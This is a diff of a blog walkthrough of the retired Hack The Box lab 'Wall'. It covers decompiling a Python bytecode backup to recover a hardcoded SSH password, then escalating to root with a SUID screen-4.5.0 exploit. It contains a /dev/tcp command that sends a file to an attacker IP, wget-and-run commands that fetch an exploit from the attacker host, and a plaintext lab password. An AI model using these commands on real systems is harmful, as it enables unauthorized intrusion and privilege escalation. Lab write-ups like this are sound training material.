+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">www-data@Wall:/$ ls -la /opt/
 total 12
 drwxr-xr-x  3 root root 4096 Jul  4 17:28 .
 drwxr-xr-x 23 root root 4096 Jul  4 00:25 ..
 drwxr-xr-x  2 root root 4096 Jul 30 17:39 .shelby
 </code></pre>
 <p>Inside:</p>
-<pre><code class="language-bash" data-language="bash">www-data@Wall:/$ ls -la /opt/.shelby/
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash">www-data@Wall:/$ ls -la /opt/.shelby/
 total 12
 drwxr-xr-x 2 root root 4096 Jul 30 17:39 .
 drwxr-xr-x 3 root root 4096 Jul  4 17:28 ..
 -rwxr-xr-x 1 root root  981 Jul 30 17:39 backup
 </code></pre>
-<pre><code class="language-bash" data-language="bash">www-data@Wall:/$ file /opt/.shelby/backup
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">www-data@Wall:/$ file /opt/.shelby/backup
 /opt/.shelby/backup: python 2.7 byte-compiled
 </code></pre>
 <h3 id="understanding-python-bytecode-pyc">Understanding Python Bytecode (<code>.pyc</code>)</h3>
@@ -509,27 +511,27 @@ drwxr-xr-x 3 root root 4096 Jul  4 17:28 ..
 <h3 id="transferring-the-file-to-kali">Transferring the File to Kali</h3>
 <p>Method 1: Netcat</p>
 <p>On Kali:</p>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 9001 &gt; backup.pyc
+<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">nc -lnvp 9001 &gt; backup.pyc
 </code></pre>
 <p>On target:</p>
-<pre><code class="language-bash" data-language="bash">cat /opt/.shelby/backup &gt; /dev/tcp/10.10.16.84/9001
+<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">cat /opt/.shelby/backup &gt; /dev/tcp/10.10.16.84/9001
 </code></pre>
 <p>Method 2: Base64</p>
 <p>On target:</p>
-<pre><code class="language-bash" data-language="bash">base64 /opt/.shelby/backup
+<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">base64 /opt/.shelby/backup
 </code></pre>
 <p>On Kali:</p>
-<pre><code class="language-bash" data-language="bash">echo "&lt;paste base64&gt;" | base64 -d &gt; backup.pyc
+<pre tabindex="0" aria-label="bash code or terminal block 37"><code class="language-bash" data-language="bash">echo "&lt;paste base64&gt;" | base64 -d &gt; backup.pyc
 </code></pre>
 <h3 id="decompiling-with-uncompyle6">Decompiling with <code>uncompyle6</code></h3>
 <p>Install if needed:</p>
-<pre><code class="language-bash" data-language="bash">pip3 install uncompyle6
+<pre tabindex="0" aria-label="bash code or terminal block 38"><code class="language-bash" data-language="bash">pip3 install uncompyle6
 </code></pre>
 <p>Decompile:</p>
-<pre><code class="language-bash" data-language="bash">uncompyle6 backup.pyc
+<pre tabindex="0" aria-label="bash code or terminal block 39"><code class="language-bash" data-language="bash">uncompyle6 backup.pyc
 </code></pre>
 <h3 id="the-decompiled-source">The Decompiled Source</h3>
-<pre><code class="language-python" data-language="python">import paramiko
+<pre tabindex="0" aria-label="python code or terminal block 40"><code class="language-python" data-language="python">import paramiko
 username = 'shelby'
 host = 'wall.htb'
 port = 22
@@ -569,10 +571,10 @@ print '[+] Done !'
 <p>This is <strong>security through obscurity</strong>. It stops casual <code>strings</code> or <code>grep</code> searches, but it doesn't stop someone who decompiles the bytecode.</p>
 <h3 id="extracting-the-password">Extracting the Password</h3>
 <p>Reading the code, the password is:</p>
-<pre><code>ShelbyPassw@rdIsStrong!
+<pre tabindex="0" aria-label="Code or terminal block 41"><code>ShelbyPassw@rdIsStrong!
 </code></pre>
 <h3 id="ssh-as-shelby">SSH as <code>shelby</code></h3>
-<pre><code class="language-bash" data-language="bash">ssh shelby@10.129.2.9
+<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">ssh shelby@10.129.2.9
 # Password: REDACTED
 </code></pre>
 
@@ -588,14 +590,14 @@ print '[+] Done !'
 </ul>
 </blockquote>
 <h3 id="capturing-the-user-flag">Capturing the User Flag</h3>
-<pre><code class="language-bash" data-language="bash">shelby@Wall:~$ cat ~/user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 43"><code class="language-bash" data-language="bash">shelby@Wall:~$ cat ~/user.txt
 eb1b6[redacted]39fa32408
 </code></pre>
 <hr>
 <h2 id="step-8-privilege-escalation-to-root">Step 8: Privilege Escalation to <code>root</code></h2>
 <h3 id="enumeration-as-shelby">Enumeration as <code>shelby</code></h3>
 <p>Now that we're a real user, we run our privilege escalation checks again:</p>
-<pre><code class="language-bash" data-language="bash"># SUID binaries
+<pre tabindex="0" aria-label="bash code or terminal block 44"><code class="language-bash" data-language="bash"># SUID binaries
 find / -perm -4000 -type f 2&gt;/dev/null
 
 # Kernel exploits
@@ -609,14 +611,14 @@ cat /etc/crontab
 ls -la /etc/cron.*
 </code></pre>
 <h3 id="the-discovery-suid-screen-4-5-0">The Discovery: SUID <code>screen-4.5.0</code></h3>
-<pre><code class="language-bash" data-language="bash">shelby@Wall:~$ find / -perm -4000 -type f 2&gt;/dev/null | grep screen
+<pre tabindex="0" aria-label="bash code or terminal block 45"><code class="language-bash" data-language="bash">shelby@Wall:~$ find / -perm -4000 -type f 2&gt;/dev/null | grep screen
 /bin/screen-4.5.0
 </code></pre>
 <p>The <code>screen</code> binary is a terminal multiplexer. Version 4.5.0 has a <strong>known local privilege escalation vulnerability</strong> because it is installed SUID root and mishandles certain file operations.</p>
 <h3 id="understanding-suid">Understanding SUID</h3>
 <p>SUID (Set User ID) is a Linux permission flag. When a SUID binary is executed, it runs with the permissions of its <strong>owner</strong>, not the user who launched it.</p>
 <p>If root owns a SUID binary, anyone who runs it temporarily becomes root during execution.</p>
-<pre><code>-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
+<pre tabindex="0" aria-label="Code or terminal block 46"><code>-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
      ↑
      The 's' means SUID is set
 </code></pre>
@@ -631,20 +633,20 @@ ls -la /etc/cron.*
 <p>We use the public exploit from the XiphosResearch repository.</p>
 <h3 id="transferring-the-exploit">Transferring the Exploit</h3>
 <p>On Kali, download it:</p>
-<pre><code class="language-bash" data-language="bash">curl -sL https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh \
+<pre tabindex="0" aria-label="bash code or terminal block 47"><code class="language-bash" data-language="bash">curl -sL https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh \
   -o ~/Downloads/htb/screenroot.sh
 </code></pre>
 <p>Serve it:</p>
-<pre><code class="language-bash" data-language="bash">cd ~/Downloads/htb
+<pre tabindex="0" aria-label="bash code or terminal block 48"><code class="language-bash" data-language="bash">cd ~/Downloads/htb
 python3 -m http.server 8080
 </code></pre>
 <p>On the target, download and execute:</p>
-<pre><code class="language-bash" data-language="bash">wget http://10.10.16.84:8080/screenroot.sh -O /dev/shm/screenroot.sh
+<pre tabindex="0" aria-label="bash code or terminal block 49"><code class="language-bash" data-language="bash">wget http://10.10.16.84:8080/screenroot.sh -O /dev/shm/screenroot.sh
 bash /dev/shm/screenroot.sh
 </code></pre>
 <h3 id="alternative-inline-base64">Alternative: Inline Base64</h3>
 <p>If you don't have internet on Kali, you can base64-encode the exploit and paste it directly:</p>
-<pre><code class="language-bash" data-language="bash">cd /dev/shm
+<pre tabindex="0" aria-label="bash code or terminal block 50"><code class="language-bash" data-language="bash">cd /dev/shm
 echo "&lt;BASE64_OF_SCREENROOT.SH&gt;" | base64 -d &gt; .a.sh
 bash .a.sh
 </code></pre>
@@ -663,7 +665,7 @@ bash .a.sh
 <li><strong>Executes <code>/tmp/rootshell</code>:</strong> Now SUID root, giving us a root shell</li>
 </ol>
 <h3 id="the-result-2">The Result</h3>
-<pre><code>~ gnu/screenroot ~
+<pre tabindex="0" aria-label="Code or terminal block 51"><code>~ gnu/screenroot ~
 [+] First, we create our shell and library...
 [+] Now we create our /etc/ld.so.preload file...
 [+] Triggering...
@@ -685,7 +687,7 @@ uid=0(root) gid=0(root) groups=0(root),6001(shelby)
 <p>For <code>screen-4.5.0</code>, a quick search for "screen 4.5.0 SUID exploit" returns multiple working proofs-of-concept. When you find a SUID binary, <strong>Google is your best friend.</strong></p>
 </blockquote>
 <h3 id="capturing-the-root-flag">Capturing the Root Flag</h3>
-<pre><code class="language-bash" data-language="bash"># cat /root/root.txt
+<pre tabindex="0" aria-label="bash code or terminal block 52"><code class="language-bash" data-language="bash"># cat /root/root.txt
 1fca[redacted]4b40
 </code></pre>
 <hr>
@@ -711,7 +713,7 @@ uid=0(root) gid=0(root) groups=0(root),6001(shelby)
 <p>Save your Nmap output, exploit scripts, and command history. Not only is this good practice for reports, but it also helps you reproduce the attack and learn from it later.</p>
 <hr>
 <h2 id="final-commands-cheat-sheet">Final Commands Cheat Sheet</h2>
-<pre><code class="language-bash" data-language="bash"># Recon
+<pre tabindex="0" aria-label="bash code or terminal block 53"><code class="language-bash" data-language="bash"># Recon
 nmap -sC -sV -p- --min-rate 10000 -oN nmap_wall.txt 10.129.2.9
 
 # Web enum
@@ -744,9 +746,9 @@ ssh shelby@10.129.2.9  # ShelbyPassw@rdIsStrong!
 wget http://10.10.16.84:8080/screenroot.sh -O /dev/shm/screenroot.sh
 bash /dev/shm/screenroot.sh
 </code></pre>
-<hr>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
-b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-vessel-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Vessel Walkthrough"}],["$","time",null,{"dateTime":"2026-06-09T11:01:30.000Z","data-depth-layer":"meta","children":"9 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-zipper-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Zipper Walkthrough"}],["$","time",null,{"dateTime":"2026-06-09T10:52:39.000Z","data-depth-layer":"meta","children":"9 Jun 2026"}]]}]}]]}]
-c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-12:T56a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/#article","headline":"Hack The Box: Wall Walkthrough","description":"HTTP verb tampering exposed Centreon, API credential testing and a WAF-bypassed poller command yielded a www-data shell, decompiled Python bytecode revealed Shelby's SSH password, and a setuid Screen 4.5.0 exploit reached root.","url":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/","datePublished":"2026-06-09T10:56:14.000Z","dateModified":"2026-06-09T10:56:14.000Z","wordCount":3284,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/5a55dcf808566b21d48a147065fc621c807f703e/HTB-Wall.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-wall-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Wall Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
-e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
-15:null
+<hr>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"introduction-and-attack-overview","label":"Introduction & Attack Overview"},{"id":"step-1-reconnaissance-with-nmap","label":"Step 1: Reconnaissance with Nmap"},{"id":"step-2-web-enumeration","label":"Step 2: Web Enumeration"},{"id":"step-3-http-verb-tampering","label":"Step 3: HTTP Verb Tampering"},{"id":"step-4-centreon-discovery-and-credential-brute-force","label":"Step 4: Centreon Discovery & Credential Brute Force"},{"id":"step-5-centreon-rce-exploitation-cve-2019-13024","label":"Step 5: Centreon RCE Exploitation (CVE-2019-13024)"},{"id":"step-6-waf-bypass-and-reverse-shell","label":"Step 6: WAF Bypass & Reverse Shell"},{"id":"step-7-privilege-escalation-to-shelby","label":"Step 7: Privilege Escalation to shelby"},{"id":"step-8-privilege-escalation-to-root","label":"Step 8: Privilege Escalation to root"},{"id":"lessons","label":"Lessons"},{"id":"final-commands-cheat-sheet","label":"Final Commands Cheat Sheet"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/5a55dcf808566b21d48a147065fc621c807f703e/HTB-Wall.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 5a55dcf80856",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Wall, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/wall","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"6 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-vessel-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Vessel Walkthrough"}],["$","time",null,{"dateTime":"2026-06-09T11:01:30.000Z","data-depth-layer":"meta","children":"9 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-zipper-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Zipper Walkthrough"}],["$","time",null,{"dateTime":"2026-06-09T10:52:39.000Z","data-depth-layer":"meta","children":"9 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T56a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/#article","headline":"Hack The Box: Wall Walkthrough","description":"HTTP verb tampering exposed Centreon, API credential testing and a WAF-bypassed poller command yielded a www-data shell, decompiled Python bytecode revealed Shelby's SSH password, and a setuid Screen 4.5.0 exploit reached root.","url":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/","datePublished":"2026-06-09T10:56:14.000Z","dateModified":"2026-06-09T10:56:14.000Z","wordCount":3284,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/5a55dcf808566b21d48a147065fc621c807f703e/HTB-Wall.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-wall-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Wall Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-wall-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
